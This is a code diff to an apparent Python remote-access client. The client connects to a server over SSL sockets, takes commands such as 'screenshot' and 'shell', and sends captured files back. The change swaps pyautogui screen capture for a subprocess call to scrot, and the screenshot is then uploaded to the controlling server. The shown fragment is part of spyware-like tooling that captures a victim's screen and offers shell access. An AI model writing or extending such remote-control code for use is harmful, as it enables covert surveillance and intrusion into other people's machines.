@@ -2,7 +2,8 @@ import socket
 import ssl
 import subprocess
 import os
-import pyautogui
+# import pyautogui
+
 
 
 def format_filename(commande):
@@ -90,8 +91,9 @@ def connect_to_server():
 
         if command.lower() == "screenshot":
             print("Taking screenshot...")
-            screenshot = pyautogui.screenshot()
-            screenshot.save("screenshot.png")
+            # screenshot = pyautogui.screenshot()
+            # screenshot.save("screenshot.png")
+            subprocess.run(["scrot", "screenshot.png"])
             download_feature("screenshot.png", s)
 
         if command.lower() == "shell":
